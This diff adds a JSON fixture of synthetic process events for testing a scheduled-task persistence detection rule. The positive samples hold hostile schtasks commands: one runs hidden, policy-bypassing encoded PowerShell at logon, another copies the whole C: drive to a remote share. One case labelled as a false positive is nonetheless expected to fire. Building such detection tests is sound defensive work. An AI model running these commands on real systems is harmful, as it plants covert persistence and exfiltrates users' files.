@@ -1,0 +1,61 @@
+{
+  "rule": "T1053.005_scheduled_task_persistence",
+  "table": "DeviceProcessEvents",
+  "note": "Synthetic events for schtasks.exe creation.",
+  "allowed_parents": [
+    "msiexec.exe",
+    "googleupdate.exe"
+  ],
+  "events": [
+    {
+      "_id": "tp_powershell_task_from_temp",
+      "FileName": "schtasks.exe",
+      "ProcessCommandLine": "schtasks /create /sc onlogon /tn \"Persistence\" /tr \"powershell.exe -ep bypass -w hidden -enc JAB...\"",
+      "InitiatingProcessFileName": "malware.exe",
+      "InitiatingProcessFolderPath": "C:\\Users\\alice\\AppData\\Local\\Temp\\malware.exe",
+      "InitiatingProcessSignerType": "None",
+      "_expected": {
+        "fires": true,
+        "severity": "High",
+        "score": 130
+      }
+    },
+    {
+      "_id": "tp_cmd_task",
+      "FileName": "schtasks.exe",
+      "ProcessCommandLine": "schtasks -create -sc daily -tn \"Backup\" -tr \"cmd.exe /c copy C:\\*.* \\\\10.0.0.5\\share\"",
+      "InitiatingProcessFileName": "python.exe",
+      "InitiatingProcessFolderPath": "C:\\Python39\\python.exe",
+      "InitiatingProcessSignerType": "Microsoft",
+      "_expected": {
+        "fires": true,
+        "severity": "Medium",
+        "score": 80
+      }
+    },
+    {
+      "_id": "fp_browser_updater",
+      "FileName": "schtasks.exe",
+      "ProcessCommandLine": "schtasks /Create /TN \"GoogleUpdateTaskMachineUA\" /RU SYSTEM",
+      "InitiatingProcessFileName": "googleupdate.exe",
+      "InitiatingProcessFolderPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+      "InitiatingProcessSignerType": "Google",
+      "_expected": {
+        "fires": false
+      }
+    },
+    {
+      "_id": "fp_signed_admin_tool",
+      "FileName": "schtasks.exe",
+      "ProcessCommandLine": "schtasks /create /tn \"Maintenance\" /tr \"C:\\Admin\\tool.exe\" /sc weekly",
+      "InitiatingProcessFileName": "svchost.exe",
+      "InitiatingProcessFolderPath": "C:\\Windows\\System32\\svchost.exe",
+      "InitiatingProcessSignerType": "Microsoft",
+      "_expected": {
+        "fires": true,
+        "severity": "Low",
+        "score": 40
+      }
+    }
+  ]
+}
